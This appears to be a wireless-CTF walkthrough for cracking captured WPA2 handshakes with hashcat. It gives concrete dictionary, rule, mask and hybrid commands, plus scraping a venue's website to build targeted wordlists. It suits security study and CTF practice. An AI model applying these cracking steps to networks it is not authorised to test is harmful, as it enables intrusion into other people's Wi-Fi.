# hashcat — walkthrough

Baseline dictionary → rule stacking → mask attack → hybrid. In that
order for a WCTF-scale PSK: the corpus of DEF CON WCTF PSKs is
mostly rockyou + best64 with occasional theme-derived candidates.

## Preconditions

- `.22000` file emitted by `hcxpcapngtool`. See `pmkid/walkthrough.md`
  or `4-way-handshake/walkthrough.md`.
- GPU host with recent hashcat (>= 6.2). Pineapple itself is CPU-only
  and unrealistic for anything past a small mask.

## Baseline dictionary

```
hashcat -m 22000 hs.22000 /path/to/rockyou.txt -w 4 --status --status-timer=5
```

Expect this to finish in seconds if the PSK is in rockyou.

## Rule stacking (best64, d3ad0ne, OneRule)

Multiplies the wordlist by transforming each candidate:

```
hashcat -m 22000 hs.22000 rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 22000 hs.22000 rockyou.txt -r rules/d3ad0ne.rule
hashcat -m 22000 hs.22000 rockyou.txt -r rules/OneRuleToRuleThemAll.rule
```

`OneRuleToRuleThemAll` is the current community-standard heavy pass.
Runtime scales with rule count × wordlist size.

## Mask attack — structure known

Common structures:

```
# 8 digits (default WPS-derived PSKs, some ISPs)
hashcat -m 22000 hs.22000 -a 3 ?d?d?d?d?d?d?d?d

# lower + 4 digits at the end (very common home PSK)
hashcat -m 22000 hs.22000 -a 3 ?l?l?l?l?l?l?d?d?d?d

# 10 chars, mix
hashcat -m 22000 hs.22000 -a 3 -1 ?l?d ?1?1?1?1?1?1?1?1?1?1
```

## Hybrid — wordlist + mask suffix / prefix

```
# suffix — wordlist then digits (Password2024)
hashcat -m 22000 hs.22000 -a 6 wordlist.txt ?d?d?d?d

# prefix — digits then wordlist
hashcat -m 22000 hs.22000 -a 7 ?d?d?d?d wordlist.txt
```

## SSID-derived wordlist

```
# cewl the venue's website
cewl -d 2 -w /tmp/site.words https://target-venue.example

# common suffixes
psudohash --words /tmp/site.words --years 2020-2026 \
  --append-numbering 2 --output /tmp/site-boosted.txt

hashcat -m 22000 hs.22000 /tmp/site-boosted.txt -r best64.rule
```

## Session save / resume

```
hashcat --session=defcon -m 22000 hs.22000 rockyou.txt -r OneRule.rule
# Ctrl-C to pause (writes session file).
hashcat --session=defcon --restore
```

## GPU tuning

- `-w 4` — insane workload (max card utilization).
- `-O` — optimized kernel; caps password length but is faster.
  hashcat 22000 optimized-kernel max length is 63 (the WPA/WPA2
  passphrase spec cap) — always safe.
- `--status --status-timer=5` — periodic ETA output.
- `--gpu-temp-abort=90` — safety cap on toaster laptops.

## Distributed cracking

- **hashtopolis** — Django/Postgres/redis coordinator. Split
  wordlists / masks across N workers.
- **hashcat brain** — real-time candidate deduplication across
  workers.

## Comparing to `airodump-ng+aircrack-ng`

`aircrack-ng` still works but is CPU-only, single-format, and
uses PMK cache poorly. hashcat with mode 22000 is the current
standard.

## Failure modes

- **`--force` says the OpenCL platform is missing.** Install the
  vendor's OpenCL runtime (nvidia-opencl, ROCm, or Apple's built-in).
- **Very slow (< 10 KH/s).** You're on the CPU. Confirm with `-I`
  that hashcat sees your GPU.
- **Cracks to a wrong candidate.** hashcat's WPA2 crack has a
  vanishingly small false-positive rate but check with
  `wpa_supplicant`'s trial association or Wireshark decrypt.
- **`WPA*01` line but PMKID mismatch.** hcxpcapngtool sometimes
  emits from a leaked M1 that isn't for the right ESSID. Filter
  the pcap with `hcxpcapngtool --essid=<name>` first.

## Cite

- hashcat.net wiki — example hashes and rule catalog.
- Steube 2018 — mode 22000 introduction.
- hcxtools GitHub — hcxpcapngtool format.
- attacks.json: `pmkid-capture`, `wpa2-4way-capture`,
  `hashcat-5500-mschapv2-crack`.
